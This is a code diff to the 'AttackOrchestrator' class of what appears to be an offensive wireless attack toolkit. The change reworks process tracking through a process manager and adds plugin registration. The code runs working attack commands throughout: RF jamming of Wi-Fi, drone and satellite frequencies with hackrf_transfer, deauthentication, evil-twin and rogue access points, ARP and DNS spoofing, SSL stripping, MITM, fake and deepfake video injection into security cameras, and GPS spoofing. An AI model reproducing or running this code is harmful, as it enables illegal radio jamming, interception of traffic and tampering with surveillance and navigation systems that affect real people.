@@ -17,8 +17,9 @@ from typing import Optional, List, Dict, Any, Tuple
 
 from .utils import (
     log_message, detected_cameras,  packet_handler, detected_cameras_lock, detected_networks, detected_networks_lock,
-    CHANNEL_TO_FREQ, HACKRF_PROCESS, ACTIVE_PROCESSES, set_channel, is_camera_mac, BASE_DIR, running, is_monitor_mode
+    CHANNEL_TO_FREQ, set_channel, is_camera_mac, BASE_DIR, running, is_monitor_mode
 )
+from .process_manager import get_process_manager
 
 # ### Dynamic Loaders for Optional Dependencies
 
@@ -226,13 +227,12 @@ class AttackOrchestrator:
         self.battery_saver = battery_saver
         self.attack_vectors: Dict[str, callable] = {}
         self.vuln_cache: Dict[str, List[Dict[str, Any]]] = {}
-        self.active_attacks: List[subprocess.Popen] = []
-        self.active_flowgraphs: List[Any] = []  # Type is dynamic due to gnuradio
+        self.active_flowgraphs: List[Any] = []
         self.attack_log: List[str] = []
         self.decision_engine = DecisionEngine()
         self.target_priority: Dict[str, float] = {}
+        self.process_manager = get_process_manager()
 
-        # Fix: add a thread-safe event to track running status
         self.running = threading.Event()
         self.running.set()
 
@@ -269,12 +269,21 @@ class AttackOrchestrator:
                 module = importlib.util.module_from_spec(spec)
                 sys.modules[plugin_name] = module
                 spec.loader.exec_module(module)
+                
+                if hasattr(module, 'register'):
+                    module.register(self)
+                
                 return module
             else:
                 raise ImportError(f"Cannot load spec for plugin: {plugin_name}")
         else:
             try:
-                return importlib.import_module(plugin_name)
+                module = importlib.import_module(plugin_name)
+                
+                if hasattr(module, 'register'):
+                    module.register(self)
+                
+                return module
             except ImportError as e:
                 raise ImportError(
                     f"Plugin '{plugin_name}' not found in attack_plugins/ or system path"
@@ -383,21 +392,12 @@ class AttackOrchestrator:
 
     def stop_all_attacks(self) -> None:
         """Stop all ongoing attacks and clean up resources."""
-        global HACKRF_PROCESS
-        for attack in self.active_attacks[:]:
-            if attack.poll() is None:
-                attack.terminate()
-                try:
-                    attack.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    attack.kill()
-                self.active_attacks.remove(attack)
-        if HACKRF_PROCESS and HACKRF_PROCESS.poll() is None:
-            HACKRF_PROCESS.terminate()
-            HACKRF_PROCESS.wait(timeout=5)
-            HACKRF_PROCESS = None
+        self.process_manager.stop_all_processes(timeout=5)
         for fg in self.active_flowgraphs[:]:
-            fg.stop()
+            try:
+                fg.stop()
+            except Exception as e:
+                self.attack_log.append(f"[WARNING] Error stopping flowgraph: {e}")
             self.active_flowgraphs.remove(fg)
         self.attack_log.append("[INFO] All attacks stopped cleanly")
 
@@ -422,8 +422,8 @@ class AttackOrchestrator:
             ["mdk4", self.interface, "b", "-a", bssid, "-s", "100", "-m"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
         )
-        self.active_attacks.append(proc)
-        threading.Timer(duration, proc.terminate).start()
+        self.process_manager.add_attack_process(proc, f"mdk4_camera_jam_{bssid}", "camera_jam")
+        threading.Timer(duration, lambda: self.process_manager._terminate_process(proc, timeout=3)).start()
         self.attack_log.append(f"[CAMERA JAM] Jamming {bssid} with MFP-aware bypass for {duration}s")
         return True
 
@@ -435,33 +435,33 @@ class AttackOrchestrator:
 
     def _rf_jam_attack(self, bssid: str = None, duration: int = 60) -> bool:
         """RF jamming with custom patterns and battery-saver mode."""
-        global HACKRF_PROCESS
         if not shutil.which("hackrf_transfer"):
             self.attack_log.append("[ERROR] hackrf_transfer not installed")
             return False
+        
         channel = detected_networks.get(bssid, {}).get('channel', '1') if bssid else '1'
         freq = CHANNEL_TO_FREQ.get(int(channel), 2412000000)
-        if HACKRF_PROCESS:
-            HACKRF_PROCESS.terminate()
-            HACKRF_PROCESS.wait()
+        
+        self.process_manager.stop_hackrf_process()
+        
         if self.battery_saver:
-            # Pulsed jamming: 1s on, 3s off
             for _ in range(int(duration / 4)):
-                HACKRF_PROCESS = subprocess.Popen(
+                proc = subprocess.Popen(
                     ["hackrf_transfer", "-t", "/dev/zero", "-f", str(freq), "-s", "2000000"],
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE
                 )
+                self.process_manager.set_hackrf_process(proc, "hackrf_pulsed_jam", "rf_jam")
                 time.sleep(1)
-                HACKRF_PROCESS.terminate()
+                self.process_manager.stop_hackrf_process()
                 time.sleep(3)
         else:
-            # Custom pattern: Modulated noise
-            HACKRF_PROCESS = subprocess.Popen(
+            proc = subprocess.Popen(
                 ["hackrf_transfer", "-t", "/dev/zero", "-f", str(freq), "-s", "2000000", "-x", "40"],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE
             )
-            time.sleep(duration)
-            HACKRF_PROCESS.terminate()
+            self.process_manager.set_hackrf_process(proc, f"hackrf_jam_{freq/1e6}MHz", "rf_jam")
+            threading.Timer(duration, self.process_manager.stop_hackrf_process).start()
+        
         self.attack_log.append(f"[RF JAM] Jamming {freq/1e6} MHz for {duration}s")
         return True
 
@@ -500,8 +500,11 @@ class AttackOrchestrator:
             ["hackrf_transfer", "-t", "temp.iq", "-f", str(int(freq * 1e6)), "-s", "8e6", "-x", str(tx_gain)],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
-        os.remove("temp.iq")
+        self.process_manager.set_hackrf_process(proc, f"voice_broadcast_{freq}MHz", "voice_broadcast")
+        try:
+            os.remove("temp.iq")
+        except Exception:
+            pass
         self.attack_log.append(f"[VOICE BROADCAST] Broadcasting {audio_file} at {freq} MHz")
         return True
 
@@ -531,7 +534,7 @@ class AttackOrchestrator:
         """Inject RTP packets."""
         proc = self.start_rtp_injection(camera_ip, video_path, ui)
         if proc:
-            self.active_attacks.append(proc)
+            self.process_manager.add_attack_process(proc, f"rtp_inject_{camera_ip}", "rtp_inject")
             self.attack_log.append(f"[RTP INJECT] Injecting into {camera_ip}")
             return True
         return False
@@ -574,7 +577,8 @@ class AttackOrchestrator:
         """Inject RTSP packets."""
         ffmpeg_proc, arpspoof_proc = self.start_rtsp_injection(camera_ip, victim_ip, fake_video_path, ui)
         if ffmpeg_proc and arpspoof_proc:
-            self.active_attacks.extend([ffmpeg_proc, arpspoof_proc])
+            self.process_manager.add_attack_process(ffmpeg_proc, f"rtsp_ffmpeg_{camera_ip}", "rtsp_inject")
+            self.process_manager.add_attack_process(arpspoof_proc, f"arpspoof_{victim_ip}", "rtsp_inject")
             self.attack_log.append(f"[RTSP INJECT] Targeting {camera_ip} -> {victim_ip}")
             return True
         return False
@@ -583,7 +587,7 @@ class AttackOrchestrator:
         """Perform MitM with Bettercap."""
         proc = self.start_bettercap_mitm(victim_ip, camera_ip, ui)
         if proc:
-            self.active_attacks.append(proc)
+            self.process_manager.add_attack_process(proc, f"bettercap_{victim_ip}", "mitm")
             self.attack_log.append(f"[BETTERCAP MITM] Targeting {victim_ip} -> {camera_ip}")
             return True
         return False
@@ -598,7 +602,7 @@ class AttackOrchestrator:
             ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", target_mac, self.interface],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"wifi_deauth_{target_mac}", "wifi_deauth")
         self.attack_log.append(f"[WIFI DEAUTH] Deauthenticating {target_mac} from {bssid}")
         return True
 
@@ -610,7 +614,7 @@ class AttackOrchestrator:
         if password:
             cmd.extend(["-P", password])
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"rogue_ap_{ssid}", "rogue_ap")
         self.attack_log.append(f"[ROGUE AP] SSID: {ssid}, Password: {password or 'Open'}")
         return True
 
@@ -622,7 +626,7 @@ class AttackOrchestrator:
             ["airbase-ng", "-e", target_ssid, "-c", "6", self.interface],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"evil_twin_{target_ssid}", "evil_twin")
         self.attack_log.append(f"[EVIL TWIN] Mimicking {target_ssid}")
         return True
 
@@ -634,7 +638,7 @@ class AttackOrchestrator:
             ["ffmpeg", "-re", "-i", video_path, "-f", "rtp", f"rtp://{target_ip}:8554"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"video_replay_{target_ip}", "camera_video_replay")
         self.attack_log.append(f"[CAMERA VIDEO REPLAY] Replaying {video_path} to {target_ip}")
         return True
 
@@ -660,7 +664,7 @@ class AttackOrchestrator:
             ["dnsspoof", "-i", self.interface, f"host {target_ip} and udp port 53", redirect_ip],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"dns_spoof_{target_ip}", "dns_spoof")
         self.attack_log.append(f"[DNS SPOOF] Redirecting {target_ip} to {redirect_ip}")
         return True
 
@@ -672,7 +676,7 @@ class AttackOrchestrator:
             ["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"arp_poison_{target_ip}", "arp_poison")
         self.attack_log.append(f"[ARP POISON] Poisoning {target_ip} via {gateway_ip}")
         return True
 
@@ -684,7 +688,7 @@ class AttackOrchestrator:
             ["sslstrip", "-l", "8080", "-t", target_ip],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"ssl_strip_{target_ip}", "ssl_strip")
         self.attack_log.append(f"[SSL STRIP] Stripping SSL for {target_ip}")
         return True
 
@@ -731,7 +735,7 @@ class AttackOrchestrator:
             ["hackrf_transfer", "-t", "/dev/zero", "-f", str(freq), "-s", "2000000"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.set_hackrf_process(proc, f"drone_jam_{freq/1e6}MHz", "drone_jam")
         self.attack_log.append(f"[DRONE JAM] Jamming at {freq/1e6} MHz")
         return True
 
@@ -749,7 +753,7 @@ class AttackOrchestrator:
             ["hackrf_transfer", "-t", "/dev/zero", "-f", str(freq), "-s", "2000000"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.set_hackrf_process(proc, f"satellite_disrupt_{freq/1e6}MHz", "satellite_disrupt")
         self.attack_log.append(f"[SATELLITE DISRUPT] Jamming at {freq/1e6} MHz")
         return True
 
@@ -789,7 +793,7 @@ class AttackOrchestrator:
             ["ffmpeg", "-loop", "1", "-i", image_path, "-c:v", "libx264", "-f", "rtsp", f"rtsp://{target_ip}:8554/live.sdp"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"rtsp_image_inject_{target_ip}", "rtsp_image_inject")
         self.attack_log.append(f"[RTSP IMAGE INJECT] Injecting {image_path} into {target_ip}")
         return True
 
@@ -801,7 +805,7 @@ class AttackOrchestrator:
             ["ffmpeg", "-re", "-i", video_path, "-c:v", "copy", "-f", "rtsp", f"rtsp://{target_ip}:8554/live.sdp"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"deepfake_video_{target_ip}", "deepfake_video_inject")
         self.attack_log.append(f"[DEEPFAKE VIDEO INJECT] Injecting {video_path} into {target_ip}")
         return True
 
@@ -822,8 +826,8 @@ class AttackOrchestrator:
             ["ubertooth-btle", "-f", "-t", target_mac],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
-        threading.Timer(duration, proc.terminate).start()
+        self.process_manager.add_attack_process(proc, f"ble_sniff_{target_mac}", "ble_sniff_mitm")
+        threading.Timer(duration, lambda: self.process_manager._terminate_process(proc, timeout=3)).start()
         self.attack_log.append(f"[BLE SNIFF MITM] Sniffing {target_mac} for {duration}s")
         return True
 
@@ -840,8 +844,8 @@ class AttackOrchestrator:
             ["hackrf_transfer", "-t", pcapng_file, "-f", str(target_freq), "-s", "2e6", "-x", "50"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
-        threading.Timer(duration/2, proc.terminate).start()
+        self.process_manager.set_hackrf_process(proc, f"replay_amplify_{target_freq/1e6}MHz", "replay_amplify")
+        threading.Timer(duration/2, self.process_manager.stop_hackrf_process).start()
         self.attack_log.append(f"[REPLAY AMPLIFY] Replaying {target_freq/1e6} MHz from {pcapng_file}")
         return True
 
@@ -1105,7 +1109,7 @@ class AttackOrchestrator:
             ["gps-sdr-sim", "-e", "brdc3540.15n", "-l", f"{latitude},{longitude},{altitude}"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        self.active_attacks.append(proc)
+        self.process_manager.add_attack_process(proc, f"gps_spoof_{latitude}_{longitude}", "gps_spoof")
         return True
 
     def start_mjpeg_injection(self, source_path: str, ui, port: int = 8080) -> bool:
